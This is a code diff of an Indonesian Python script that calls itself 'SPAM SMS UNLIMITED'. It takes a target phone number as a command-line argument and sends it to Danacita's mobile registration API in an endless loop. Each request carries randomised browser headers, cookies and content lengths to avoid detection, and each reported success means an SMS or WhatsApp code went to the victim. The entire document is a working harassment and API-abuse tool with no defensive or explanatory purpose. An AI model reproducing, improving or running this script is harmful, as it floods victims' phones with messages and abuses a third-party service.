@@ -4,22 +4,23 @@ import time
 import random
 import os, sys, time, json, requests
 from colorama import Fore, init
+from sys import argv
 import random
 import uuid
 
 init(autoreset=True)
 
-def autotype(s):
-    for c in s + "\n":
-        sys.stdout.write(c)
+def autotype(sync):
+    for change in sync + "\n":
+        sys.stdout.write(change)
         sys.stdout.flush()
         time.sleep(0.008)
 
-B = Fore.BLUE
-W = Fore.WHITE
-R = Fore.RED
-G = Fore.GREEN
-Y = Fore.YELLOW
+BlueTerm = Fore.BLUE
+WhiteTerm = Fore.WHITE
+RedTerm = Fore.RED
+GreenTerm = Fore.GREEN
+YellowTerm = Fore.YELLOW
 
 hijau = "\033[1;92m"
 putih = "\033[1;97m"
@@ -46,19 +47,18 @@ def generate_sec_ch_ua():
     versions = [str(random.randint(70, 130)) for _ in range(3)]
     return f"\"{random.choice(brands)}\";v=\"{versions[0]}\", \"{random.choice(brands)}\";v=\"{versions[1]}\", \"{random.choice(brands)}\";v=\"{versions[2]}\""
 
-# Function to generate random Sec-Ch-Ua-Platform
 def generate_sec_ch_ua_platform():
     platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
     return f"\"{random.choice(platforms)}\""
 
-inputNomer = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Target (ex: +628xxx){W}: ")    
+inputNomer = argv[1]    
 
 def generate_headers():
     return {
         "Accept": "application/json, text/plain, */*",
         "Accept-Encoding": "gzip, deflate, br, zstd",
         "Accept-Language": generate_accept_language(),
-        "Content-Length": str(random.randint(20, 50)),  # Random content length
+        "Content-Length": str(random.randint(20, 50)), 
         "Content-Type": "application/json",
         "Cookie": generate_cookie(),
         "Origin": "https://app.danacita.co.id",
@@ -77,14 +77,14 @@ data_danacita = json.dumps({
     "username": inputNomer,
 })
 
-print(f"{W}[{hijau}• SPAM SMS UNLIMITED{kuning}•{hijau}•{W}]")
+print(f"{WhiteTerm}[{hijau}• SPAM SMS UNLIMITED{kuning}•{hijau}•{WhiteTerm}]")
 while True:
     headers_danacita = generate_headers()
     response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
     
     if response_danacita.status_code == 200:
-        print(f"{G}Berhasil mengirim SMS/WA via Danacita")
+        print(f"{GreenTerm}Berhasil mengirim SMS/WA via Danacita")
     else:
-        print(f"{R}Gagal mengirim SMS/WA via Danacita")
+        print(f"{RedTerm}Gagal mengirim SMS/WA via Danacita")
     
     
